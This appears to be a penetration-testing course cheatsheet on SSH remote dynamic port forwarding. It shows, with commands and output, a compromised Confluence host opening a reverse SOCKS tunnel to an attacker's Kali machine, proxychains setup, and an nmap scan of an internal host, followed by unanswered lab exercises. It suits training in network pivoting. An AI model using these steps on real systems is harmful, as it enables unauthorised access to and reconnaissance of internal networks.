# SSH Remote Dynamic Port Forwarding

The SSH remote dynamic port forward layout applied to the remote port forward scenario
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Remote-Dynamic-Port-Forwarding-1.png)

The SSH remote dynamic port forward setup we are aiming for
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Remote-Dynamic-Port-Forwarding-2.png)

Making the SSH connection with the remote dynamic port forwarding option
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
>
># ========== Expected Result ==========
><in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
># =====================================
>
>confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
>
># ========== Expected Result ==========
><n/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4   
>Could not create directory '/home/confluence/.ssh'.
>The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
>ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>yes
>Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
>kali@192.168.118.4's password:
># =====================================
>```

Port 9998 bound to both IPv4 and IPv6 loopback interfaces on the Kali machine
>``` shell
>kali@kali:~$ sudo ss -ntplu
>
># ========== Expected Result ==========
>Netid State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process
>tcp   LISTEN  0       128          127.0.0.1:9998        0.0.0.0:*     users:(("sshd",pid=939038,fd=9))
>tcp   LISTEN  0       128            0.0.0.0:22          0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
>tcp   LISTEN  0       128              [::1]:9998           [::]:*     users:(("sshd",pid=939038,fd=7))
>tcp   LISTEN  0       128               [::]:22             [::]:*     users:(("sshd",pid=181432,fd=4))
># =====================================
>```

Editing the Proxychains configuration file to point to the new SOCKS proxy on port 9998
>``` shell
>kali@kali:~$ tail /etc/proxychains4.conf
>
># ========== Expected Result ==========
>#       proxy types: http, socks4, socks5, raw
>#         * raw: The traffic is simply forwarded to the proxy without modification.
>#        ( auth types supported: "basic"-http  "user/pass"-socks )
>#
>[ProxyList]
># add proxy here ...
># meanwile
># defaults set to "tor"
>socks5 127.0.0.1 9998
># =====================================
>```

Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains
>``` shell
>kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
>
># ========== Expected Result ==========
>[proxychains] config file found: /etc/proxychains4.conf
>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
>[proxychains] DLL init: proxychains-ng 4.16
>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
>Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 06:25 EDT
>Initiating Connect Scan at 06:25
>Scanning 10.4.50.64 [20 ports]
>[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.64:22 <--socket error or timeout!
>...
>[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.64:135  ...  OK
>Discovered open port 135/tcp on 10.4.50.64
>Completed Connect Scan at 06:28, 210.26s elapsed (20 total ports)
>Nmap scan report for 10.4.50.64
>Host is up, received user-set (6.7s latency).
>Scanned at 2022-07-20 06:25:25 EDT for 210s
>
>PORT     STATE  SERVICE       REASON
>21/tcp   closed ftp           conn-refused
>22/tcp   closed ssh           conn-refused
>23/tcp   closed telnet        conn-refused
>25/tcp   closed smtp          conn-refused
>53/tcp   closed domain        conn-refused
>80/tcp   open   http          syn-ack
>110/tcp  closed pop3          conn-refused
>111/tcp  closed rpcbind       conn-refused
>135/tcp  open   msrpc         syn-ack
>139/tcp  closed netbios-ssn   conn-refused
>143/tcp  closed imap          conn-refused
>443/tcp  closed https         conn-refused
>445/tcp  closed microsoft-ds  conn-refused
>993/tcp  closed imaps         conn-refused
>995/tcp  closed pop3s         conn-refused
>1723/tcp closed pptp          conn-refused
>3306/tcp closed mysql         conn-refused
>3389/tcp open   ms-wbt-server syn-ack
>5900/tcp closed vnc           conn-refused
>8080/tcp closed http-proxy    conn-refused
>
>Read data files from: /usr/bin/../share/nmap
>Nmap done: 1 IP address (1 host up) scanned in 210.31 seconds
># =====================================
>```

Lab 1 - Follow the steps in this section to set up a remote dynamic port forward from CONFLUENCE01. Scan ports 9050-9100 on MULTISERVER03 through it. Which port is open? (Note: Make sure to scan MULTISERVER03 on its internal interface at 10.4.X.64).
>``` shell
>
>```
>

Lab 2 - Capstone Lab: Download the ssh_remote_dynamic_client binary from the Resources section. If you're running the aarch64 build of Kali, download the ssh_remote_dynamic_client_aarch64 binary. Run the binary against the port you just found on MULTISERVER03 through the remote dynamic port forward.
>``` shell
>
>```
>
